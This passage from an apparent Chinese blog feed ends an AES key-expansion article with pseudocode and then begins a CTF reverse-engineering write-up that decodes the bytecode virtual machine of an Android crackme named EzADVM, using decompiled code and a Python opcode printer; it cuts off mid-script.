<span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">3</span>]&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &lt; <span class="number">52</span>; i++)<span class="comment">//第二个for循环，填充后面的内容</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = w[i<span class="number">-1</span>];<span class="comment">//保存上一个字</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">6</span> == <span class="number">0</span>)<span class="comment">//如果整除6</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (<span class="title function_">RotWord</span> (temp))</span><br><span class="line">                    xor Rcon[i/<span class="number">6</span>];<span class="comment">//对保存的上一个字进行复杂的处理</span></span><br><span class="line">        w[i] = w[i<span class="number">-6</span>] xor temp;<span class="comment">/*将上一个字（处理或没处理过）</span></span><br><span class="line"><span class="comment">                               与6个字之前的字进行异或，得到当前的字*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>（3）AES-256的密钥扩展方法：</strong></p><p>AES-256的密钥长度为8字。其密钥扩展与AES-128也基本相同，只是修改了填充的字数，值得注意的是：AES-256在第二个for循环里添加了判断条件，当i%==4时，要对temp进行一次字代替。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只是伪代码，不能运行</span></span><br><span class="line"><span class="title function_">KeyExpansion</span>(<span class="type">byte</span> <span class="built_in">key</span>[<span class="number">32</span>], word w[<span class="number">60</span>])</span><br><span class="line">&#123;</span><br><span class="line">    word temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)<span class="comment">//第一个for循环，填充w的前8个字</span></span><br><span class="line">        w[i] = &#123;<span class="built_in">key</span>[<span class="number">4</span>*i], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">1</span>], </span><br><span class="line">                <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">2</span>], <span class="built_in">key</span>[<span class="number">4</span>*i+<span class="number">3</span>]&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">8</span>; i &lt; <span class="number">60</span>; i++)<span class="comment">//第二个for循环，填充后面的内容</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp = w[i<span class="number">-1</span>];<span class="comment">//保存上一个字</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>)<span class="comment">//如果整除8</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (<span class="title function_">RotWord</span> (temp))</span><br><span class="line">                    xor Rcon[i/<span class="number">8</span>];<span class="comment">//对保存的上一个字进行复杂的处理</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(i % <span class="number">8</span> == <span class="number">4</span>)<span class="comment">//如果除8余4</span></span><br><span class="line">            temp = <span class="title function_">SubWord</span> (temp);</span><br><span class="line">        w[i] = w[i<span class="number">-8</span>] xor temp;<span class="comment">/*将上一个字（处理或没处理过）</span></span><br><span class="line"><span class="comment">                               与6个字之前的字进行异或，得到当前的字*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://xn--zhuanlan-u11qx77cqzag36q.zhihu.com/p/360393988">此段摘自zhuanlan.zhihu.com/p/360393988</a></p></blockquote><h3 id="总过程">总过程</h3><p>加密时，执行：</p><ul><li>轮密钥加</li><li>（字节替代+行位移+列混淆+轮密钥加）*9</li><li>字节替代+行位移+轮密钥加</li></ul><p>以上过程是对于16字节密钥的</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> 加密方法 </tag>
            
            <tag> 对称加密 </tag>
            
            <tag> 流加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-VM(2)</title>
      <link href="/posts/b22e135.html"/>
      <url>/posts/b22e135.html</url>
      
        <content type="html"><![CDATA[<p>尝试对虚拟机保护有更深的理解。</p><p>由于之前做vm题感觉完全不会，所以找了几道题试一试</p><p>由之前的vm简要介绍看到vm题总是给出opcode的运行方式，然后通过opcode还原出运行逻辑，最后求出flag</p><h2 id="EzADVM">EzADVM</h2><p>这个是个安卓vm，jadx打开，然后打开main_activity,</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">CheckClick</span><span class="params">(View a)</span> &#123;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">tv</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.sampleText;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">flagText</span> <span class="operator">=</span> <span class="built_in">this</span>.binding.flagtext;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flagstring</span> <span class="operator">=</span> flagText.getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;Right!&quot;</span>.equals(stringFromJNI(flagstring))) &#123;</span><br><span class="line">            tv.setText(<span class="string">&quot;Right!&quot;</span>);</span><br><span class="line">            tv.setTextColor(-<span class="number">16711936</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>看到有stringFromJNI(flagstring)，去找函数原型，没找到，应该在库里。</p><p>用apktool反编译出源代码。打开so文件</p><p>重点是这些：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">now_num = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">1</span>;</span><br><span class="line">  used_char = _JNIEnv::GetStringUTFChars(in, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !i++ )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_29:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::basic_string&lt;decltype(nullptr)&gt;(v14, <span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        v7 = (<span class="type">const</span> <span class="type">char</span> *)sub_20F50(v14);</span><br><span class="line">        v13 = _JNIEnv::NewStringUTF(in, v7);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v14);</span><br><span class="line">        <span class="keyword">return</span> v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( code[i] != <span class="number">0x21</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __strcpy_chk(input, used_char, <span class="number">1024LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0xFF</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">    <span class="keyword">if</span> ( code[i] == <span class="number">0x88</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( code[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xA1</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = or_not_num &amp; or_num;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC3</span>u:</span><br><span class="line">        or_num = b1 | b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xB2</span>u:</span><br><span class="line">        not_1 = ~b1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xE5</span>u:</span><br><span class="line">        not_2 = ~b2;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xF1</span>u:</span><br><span class="line">        b1 = input[now_num];</span><br><span class="line">        b2 = input[++now_num];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xD4</span>u:</span><br><span class="line">        or_not_num = not_2 | not_1;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBF</span>u:</span><br><span class="line">        i_form = now_num++;</span><br><span class="line">        save[<span class="number">0</span>] = s[i_form];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x99</span>u:</span><br><span class="line">        now_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBB</span>u:</span><br><span class="line">        s[now_num - <span class="number">1</span>] = now_num + save[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;last, s, <span class="number">0x20</span>uLL) )</span><br></pre></td></tr></table></figure><p>输入用来初始化input了，所以相当于是用指令码对input加密，最后得到last</p><p>以及一开始有一个循环只有当code[i]==0先1时才会执行初始化，所以只需要匹配合理的指令即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, </span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, </span><br><span class="line">        <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, </span><br><span class="line">        <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, </span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0xF1</span>, <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, </span><br><span class="line">        <span class="number">0xA1</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x61</span>, <span class="number">0x44</span>, <span class="number">0x64</span>, <span class="number">0xF1</span>, </span><br><span class="line">        <span class="number">0xC3</span>, <span class="number">0xB2</span>, <span class="number">0xE5</span>, <span class="number">0xD4</span>, <span class="number">0xA1</span>, <span class="number">0x99</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x66</span>, <span class="number">0x6C</span>, </span><br><span class="line">        <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, </span><br><span class="line">        <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, </span><br><span class="line">        <span class="number">0x6C</span>, <span class="number">0x67</span>, <span class="number">0x69</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x7D</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0xBF</span>, <span class="number">0xBB</span>, </span><br><span class="line">        <span class="number">0xBF</span>, <span class="number">0xBB</span>, <span class="number">0x99</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x53</span>, </span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x88</span>, <span class="number">0xFF</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, </span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> opcode:</span><br><span class="line">    <span class="keyword">match</span> code:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xa1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;last[now_num - 1] = or_not_num &amp; or_num&quot;</span> )</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xc3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_num = b1 | b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xb2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_1 = ~b1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xe5</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not_2 = ~b2&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xf1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b1 = input[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num += 1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;b2 = input[now_num]&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xd4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;or_not_num = not_2 | not_1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xbf</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;save = last[now_num]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num+=1&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x99</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;now_num = 